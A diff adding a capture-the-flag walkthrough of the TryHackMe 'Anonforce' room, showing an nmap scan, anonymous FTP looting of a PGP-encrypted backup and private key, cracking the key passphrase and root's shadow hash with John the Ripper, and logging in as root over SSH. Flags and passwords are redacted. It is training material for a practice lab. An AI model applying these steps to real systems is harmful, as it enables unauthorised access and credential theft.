@@ -1,0 +1,178 @@
+#Title: Anonforce
+#Difficulty: Easy
+
+```shell
+THM="10.10.156.118"
+```
+
+```bash
+nmap -sC -sV $THM
+```
+
+```shell
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+| drwxr-xr-x   17 0        0            3700 Nov 13 15:02 dev
+| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+| drwx------    2 0        0           16384 Aug 11  2019 lost+found
+| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+| dr-xr-xr-x  101 0        0               0 Nov 13 15:02 proc
+| drwx------    3 0        0            4096 Aug 11  2019 root
+| drwxr-xr-x   18 0        0             540 Nov 13 15:02 run
+| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+| dr-xr-xr-x   13 0        0               0 Nov 13 15:02 sys
+|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.6.87.204
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
+|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
+|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+There are 2 ports open running ssh and ftp. Lets start with ftp. Nmap shows that there is a anonymous user open. For logging in as anonymous write this. Leave the password empty and press enter.
+
+```bash
+ftp anonymous@$THM 
+
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+
+Lets check the directories a bit. We change directory to home and then get the user.txt to our own machine. We can then cat and get the flag.
+
+```bash
+ftp> cd home
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||5913|)
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+226 Directory send OK.
+ftp> cd melodias
+250 Directory successfully changed.
+ftp> get user.txt
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||34121|)
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+100% |************************************************************************|    33      266.33 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.31 KiB/s)
+ftp> 
+```
+
+In the nmap when we look at directories there is a notread folder. Lets see whats in the directory. There are 2 files. A backup and a private key. We can not just use that to see the backup but we can decrypt it.
+
+```bash
+ftp> cd notread
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||45168|)
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
+-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
+226 Directory send OK.
+ftp> get *
+local: 37292 remote: *
+229 Entering Extended Passive Mode (|||43015|)
+550 Failed to open file.
+ftp> get backup.pgp
+local: backup.pgp remote: backup.pgp
+229 Entering Extended Passive Mode (|||6406|)
+150 Opening BINARY mode data connection for backup.pgp (524 bytes).
+100% |************************************************************************|   524        3.70 MiB/s    00:00 ETA
+226 Transfer complete.
+524 bytes received in 00:00 (5.05 KiB/s)
+ftp> get private.asc
+local: private.asc remote: private.asc
+229 Entering Extended Passive Mode (|||53204|)
+150 Opening BINARY mode data connection for private.asc (3762 bytes).
+100% |************************************************************************|  3762       28.47 MiB/s    00:00 ETA
+226 Transfer complete.
+3762 bytes received in 00:00 (34.81 KiB/s)
+ftp> 
+```
+
+Next part lets decrypt it.
+
+```bash
+gpg2john private.asc > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+```shell
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<Redacted>          (anonforce) 
+```
+
+```bash
+gpg -d backup.pgp
+```
+
+And write the password you got. Then we can see all /etc/passwd as plain text. `root:<Redacted>:18120:0:99999:7:::`. Take the part that is Redacted right now and add to a file with nano. Then use john to decrypt it.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<Redacted>           (?)     
+1g 0:00:00:00 DONE (2023-11-13 18:25) 3.225g/s 29729p/s 29729c/s 29729C/s horoscope..sassy123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+We get the password for the root and we can now login with ssh as root.
+
+```bash
+ssh root@$THM
+```
+
+BOOOOOOMM!!! We are root.
+
+```bash
+root@ubuntu:~# ls
+root.txt
+root@ubuntu:~# cat root.txt
+<Redacted>
+```
+
+That is it. See you on another room.
